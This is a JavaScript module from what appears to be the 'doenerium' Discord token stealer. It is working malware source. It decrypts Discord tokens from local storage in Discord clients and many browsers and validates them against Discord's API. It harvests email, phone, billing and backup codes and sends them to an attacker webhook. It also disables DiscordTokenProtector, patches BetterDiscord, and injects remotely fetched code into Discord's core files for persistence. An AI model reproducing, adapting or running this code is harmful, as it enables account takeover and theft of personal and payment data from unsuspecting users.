module.exports = (client) => {
    return {

        async getTokens() {
            var paths = {
                'Discord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': client.utils.encryption.decryptData(client.config.user.appdata) + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': client.utils.encryption.decryptData(client.config.user.appdata) + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
                'Uran': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': client.utils.encryption.decryptData(client.config.user.localappdata) + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for (let [key, value] of Object.entries(paths)) {
                if (!client.requires.fs.existsSync(value)) {
                    continue;
                }

                for (var file_name of client.requires.fs.readdirSync(value)) {
                    if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
                        continue;
                    }

                    let path_split = value.split('\\'),
                        path_split_tail = value.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
                        path_tail = path_split_tail.join('\\') + '\\';



                    for (var line of client.requires.fs.readFileSync(`${value}/${file_name}`, encoding = "utf8").split("\n")) {

                        if (value.includes("cord")) {

                            let encrypted = Buffer.from(JSON.parse(client.requires.fs.readFileSync(path_tail.replace("Local Storage", "Local State")))
                                    .os_crypt.encrypted_key, 'base64')
                                .slice(5);

                            const _key = client.requires.dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, 'CurrentUser');

                            var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/;
                            if (line.match(encrypted_regex)) {
                                try {
                                var token = Buffer.from(line.match(encrypted_regex)[0].split('dQw4w9WgXcQ:')[1], "base64");
                                let start = token.slice(3, 15),
                                    middle = token.slice(15, token.length - 16),
                                    end = token.slice(token.length - 16, token.length),
                                    decipher = client.requires.crypto.createDecipheriv('aes-256-gcm', _key, start);

                                decipher.setAuthTag(end);
                                token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')

                                await this.validateToken(key, token);
                                } catch {}
                            }
                        } else {
                            [/\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/].forEach(async (regex) => {
                                if (line.match(regex)) {
                                    await this.validateToken(key, line.match(regex)[0]);
                                }
                            })
                        }
                    }
                }
            }


        },

        async validateToken(source, token) {

            if (client.config.environ.validated_tokens.contains(token)) {
                return;
            }

            client.config.environ.validated_tokens.push(token)

            const req = await client.requires.axios({
                url: "https://discord.com/api/v9/users/@me",
                method: "GET",
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
            }).catch((err) => {
                return err.response;
            });

            if (req.request.res.statusCode == 200) {

                const billing = await client.requires.axios({
                    url: "https://discord.com/api/v9/users/@me/billing/payment-sources",
                    method: "GET",
                    headers: {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                    }
                }).catch((err) => {
                    return err.response;
                });

                var _billing = [];

                try {

                billing.data.forEach(billing => {
                    if (billing.type == "") {
                        return "false"
                    } else if (billing.invalid == true) {
                        return "false"
                    } else if (billing.type == 2) {
                        _billing.push("PayPal")
                    } else if (billing.type == 1) {
                        _billing.push(`Credit Card (${billing.country})`)
                    }
                })

                } catch {}

                if (!client.config.discord.grabbed_tokens[source]) {
                    client.config.discord.grabbed_tokens[source] = []
                }

                client.config.discord.grabbed_tokens[source].push({
                    "source": source,
                    "id": req.data.id,
                    "username": `${req.data.username}#${req.data.discriminator}`,
                    "phone": req.data.phone,
                    "email": req.data.email,
                    "locale": req.data.locale,
                    "nitro": this.getNitro(req.data.premium_type),
                    "badges": this.getBadges(req.data.flags),
                    "billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                    "token": token
                });

                client.config.discord.grabbed_tokens.all.push({
                    "source": source,
                    "id": req.data.id,
                    "username": `${req.data.username}#${req.data.discriminator}`,
                    "phone": req.data.phone,
                    "email": req.data.email,
                    "locale": req.data.locale,
                    "nitro": this.getNitro(req.data.premium_type),
                    "badges": this.getBadges(req.data.flags),
                    "billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                    "token": token
                });

                var fields = [];

                for (let [key, value] of Object.entries({
                        "Source": source,
                        "Identifier": req.data.id,
                        "Username": `${req.data.username}#${req.data.discriminator}`,
                        "Phone Number": req.data.phone,
                        "E-Mail Address": req.data.email,
                        "Locale": req.data.locale,
                        "Nitro": this.getNitro(req.data.premium_type),
                        "Badges": this.getBadges(req.data.flags) != '' ? this.getBadges(req.data.flags) : 'None',
                        "Billing": _billing.join(", ") != '' ? _billing.join(", ") : 'None',
                        "Token": token
                    })) {
                    fields.push({
                        name: key,
                        value: `\`\`\`${value}\`\`\``,
                        inline: true,
                    })
                }

                await client.utils.webhook.sendToWebhook(
                    {
                        "embeds": [client.utils.webhook.createEmbed({
                            "title": `Found token in: ${source}`,
                            "fields": fields,
                            "thumbnail": {
                                "url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                            },
                            "author": {
                                "name": `${req.data.username}#${req.data.discriminator} (${req.data.id})`,
                                "url": client.utils.encryption.decryptData(client.config.embed.href),
                                "icon_url": req.data.avatar ? `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                            },
                        })],
                    })
            }
        },

        async saveDiscordTokens() {
            if (client.config.discord.grabbed_tokens.all.length == 0) {
                return;
            }
            client.utils.jszip.createFolder("\\Discord")

            for (let [key, value] of Object.entries(client.config.discord.grabbed_tokens)) {
                if (value.length != 0) {
                    let result = "";

                    for (let obj of value) {
                        result += `==================================================\nSource          : ${obj.source}\nIdentifier      : ${obj.id}\nUsername        : ${obj.username}\nPhone           : ${obj.phone}\nE-Mail Address  : ${obj.email}\nLocale          : ${obj.locale}\nNitro           : ${obj.nitro}\nBadges          : ${obj.badges != '' ? obj.badges : 'None'}\nBilling         : ${obj.billing != '' ? obj.billing : 'None'}\nToken           : ${obj.token}\n==================================================\n\n`;
                    }

                    client.utils.jszip.createTxt(`\\Discord\\${key.toUpperCase()}.txt`, result)
                }
            }
        },

        getBadges(flags) {
            var badges = {
                Discord_Employee: {
                    Value: 1,
                    Emoji: "Discord Employee",
                    Rare: true,
                },
                Partnered_Server_Owner: {
                    Value: 2,
                    Emoji: "Partnered Server Owner",
                    Rare: true,
                },
                HypeSquad_Events: {
                    Value: 4,
                    Emoji: "HypeSquad Events",
                    Rare: true,
                },
                Bug_Hunter_Level_1: {
                    Value: 8,
                    Emoji: "Bug Hunter Level 1",
                    Rare: true,
                },
                Early_Supporter: {
                    Value: 512,
                    Emoji: "Early Supporter",
                    Rare: true,
                },
                Bug_Hunter_Level_2: {
                    Value: 16384,
                    Emoji: "Bug Hunter Level 2",
                    Rare: true,
                },
                Early_Verified_Bot_Developer: {
                    Value: 131072,
                    Emoji: "Early Verified Bot Developer",
                    Rare: true,
                },
                House_Bravery: {
                    Value: 64,
                    Emoji: "House Bravery",
                    Rare: false,
                },
                House_Brilliance: {
                    Value: 128,
                    Emoji: "House Brilliance",
                    Rare: false,
                },
                House_Balance: {
                    Value: 256,
                    Emoji: "House Balance",
                    Rare: false,
                }
            };

            var result = [];
            for (var prop in badges) {
                prop = badges[prop]
                if ((flags & prop.Value) == prop.Value && prop.Rare) result.push(prop.Emoji);
            };
            return result.join(", ");
        },

        getNitro(premium_type) {
            switch (premium_type) {
                case 0:
                    return "No Nitro";
                case 1:
                    return "Nitro Classic";
                case 2:
                    return "Nitro Boost";
                default:
                    return "No Nitro";

            };
        },

        bypass_token_protector() {
            for (const file of ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]) {
                if (client.requires.fs.exists(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`)) {
                    client.requires.fs.rm(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${file}`);
                }
            }

            const token_protector_config = JSON.parse(client.requires.fs.readFileSync(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`, {
                encoding: "utf-8"
            }))

            token_protector_config['auto_start'] = false
            token_protector_config['auto_start_discord'] = false
            token_protector_config['integrity'] = false
            token_protector_config['integrity_allowbetterdiscord'] = false
            token_protector_config['integrity_checkexecutable'] = false
            token_protector_config['integrity_checkhash'] = false
            token_protector_config['integrity_checkmodule'] = false
            token_protector_config['integrity_checkscripts'] = false
            token_protector_config['integrity_checkresource'] = false
            token_protector_config['integrity_redownloadhashes'] = false
            token_protector_config['iterations_iv'] = 0
            token_protector_config['iterations_key'] = 0
            token_protector_config['version'] = 0

            client.requires.fs.writeFileSync(
                `${client.utils.encryption.decryptData(client.config.user.localappdata)}\\DiscordTokenProtector\\config.json`,
                JSON.stringify(
                    token_protector_config,
                    null, 4
                )
            )
        },

        async listExecutables() {
            var processes = []
            client.requires.child_process.exec('tasklist', (err, stdout) => {
                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                    if (stdout.includes(executable)) {
                        client.config.discord.running_executables.push(executable)
                        processes.push(executable)
                    }
                }
            })

            return processes
        },

        pwnBetterDiscord() {
            if (client.requires.fs.existsSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")) {
                var _ = client.requires.fs.readFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")
                client.requires.fs.writeFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar", client.requires.buf_replace(_,
                    "api/webhooks", "doenerium_on_top"))

            }

        },

        async modify_discord_core() {
            const res = await client.requires.axios.get(client.utils.encryption.decryptData(client.config.discord.base_url));

            const file = () => {
                let tempFile = res.data.replace('%WEBHOOK_LINK%', client.config.webhook.url)
                return tempFile;
            }

            for (const path of client.config.discord.files_path) {
                client.requires.fs.writeFileSync(path, file(), {
                    encoding: 'utf8',
                    flag: 'w'
                });
            }
        },

        findDiscordCore(prefixPath, files) {
            files.forEach((file) => {
                if (client.requires.fs.statSync(`${prefixPath}\\${file}`).isDirectory()) {
                    this.findDiscordCore(`${prefixPath}\\${file}`, client.requires.fs.readdirSync(`${prefixPath}\\${file}`))
                } else {
                    if (file == "index.js" && !prefixPath.includes("node_modules") && prefixPath.includes("desktop_core")) {
                        client.config.discord.files_path.push(`${prefixPath}\\${file}`);
                    }
                }
            })
        },

        findBackupCodes(prefixPath, files) {
            files.forEach(async (file) => {
                if (file.startsWith(".") || file.includes("AppData") || file.includes("Program")) {
                    return;
                }
                if (file.startsWith("discord_backup_codes")) {
                    await client.utils.webhook.sendToWebhook(
                        {
                            "embeds": [client.utils.webhook.createEmbed({
                                "title": `💰 Discord backup codes found`,
                                "description": `\`\`\`${prefixPath}\\${file}\n\n${client.requires.fs.readFileSync(`${prefixPath}\\${file}`)}\`\`\``,
                            })],
                        })
                    client.utils.jszip.createTxt(`\\${file}_${client.requires.crypto.randomUUID()}.txt`, client.requires.fs.readFileSync(`${prefixPath}\\${file}`))
                }
            })
        },

        async getIP() {
            return (await client.requires.axios.get("https://ipinfo.io/json")).data;
        },

        async init() {
            this.pwnBetterDiscord();
            for (const folder of client.requires.fs.readdirSync(client.utils.encryption.decryptData(client.config.user.localappdata))) {
                if (folder.toLowerCase().includes('iscord')) {
                    client.config.discord.executables.push(`${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${folder}`)
                }
            }

            for (const executable of client.config.discord.executables) {
                this.findDiscordCore(executable, client.requires.fs.readdirSync(executable))
            }

            ["Videos", "Desktop", "Documents", "Downloads", "Pictures"].forEach(async (type) => {
                await this.findBackupCodes(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`, client.requires.fs.readdirSync(`${client.utils.encryption.decryptData(client.config.user.hostdir)}\\${type}`))
            })

            await this.modify_discord_core(); // 1

            await client.requires.child_process.exec('tasklist', async (err, stdout) => {
                for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                    if (stdout.includes(executable)) {
                        await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => {}) // Close
                        await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {}) // Start
                    }
                }
            })

            const network_data = await this.getIP();

            client.utils.jszip.createTxt("\\Network Data.txt", `IP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}`)

            await client.utils.time.sleep(30000);
            for (const path of client.config.discord.files_path) {
                if (client.requires.fs.existsSync(path.replace("index.js", "doenerium"))) {
                    client.requires.fs.rmdirSync(path.replace("index.js", "doenerium"));
                }
            }
        }
    };
};
